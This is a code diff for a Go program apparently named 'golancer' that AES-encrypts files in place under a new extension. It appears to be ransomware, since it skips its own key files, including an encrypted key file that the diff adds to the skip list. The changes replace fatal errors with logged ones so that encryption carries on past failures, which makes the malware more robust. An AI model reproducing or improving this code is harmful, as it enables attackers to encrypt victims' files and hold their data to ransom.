@@ -198,12 +198,14 @@ func EncryptFile(filename string, extension string, aeskey []byte) {
 		return
 	case strings.HasSuffix(filename, "golancer.key"):
 		return
+	case strings.HasSuffix(filename, "golancer-e.key"):
+		return
 	}
 
 	// Open target file
 	infile, err := os.Open(filename)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 	// Close file once function has finished execution
 	defer infile.Close()
@@ -211,18 +213,18 @@ func EncryptFile(filename string, extension string, aeskey []byte) {
 	// Create cipher block using an AES key
 	block, err := aes.NewCipher(aeskey)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	// Create random initialization vector
 	initvector := make([]byte, block.BlockSize())
 	if _, err := io.ReadFull(rand.Reader, initvector); err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	outfile, err := os.OpenFile(filename+extension, os.O_RDWR|os.O_CREATE, 0777)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 	defer outfile.Close()
 
@@ -244,6 +246,7 @@ func EncryptFile(filename string, extension string, aeskey []byte) {
 
 		if err != nil {
 			log.Printf("Read %d bytes: %v", n, err)
+			return
 		}
 
 	}
@@ -265,13 +268,13 @@ func DecryptFile(filename string, extension string, aeskey []byte) {
 	// Create cipher block using an AES key
 	block, err := aes.NewCipher(aeskey)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	// Get file statistics, used for grabbing file size
 	fileinfo, err := infile.Stat()
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 
 	// Initialization vector (IV) will be read from the end of the file.
@@ -281,12 +284,12 @@ func DecryptFile(filename string, extension string, aeskey []byte) {
 	// Read the IV from the file
 	_, err = infile.ReadAt(initvector, msgLen)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 	// Create file to write decrypted contents
 	outfile, err := os.OpenFile(filename, os.O_RDWR|os.O_CREATE, 0777)
 	if err != nil {
-		log.Fatal(err)
+		log.Println(err)
 	}
 	defer outfile.Close()
 
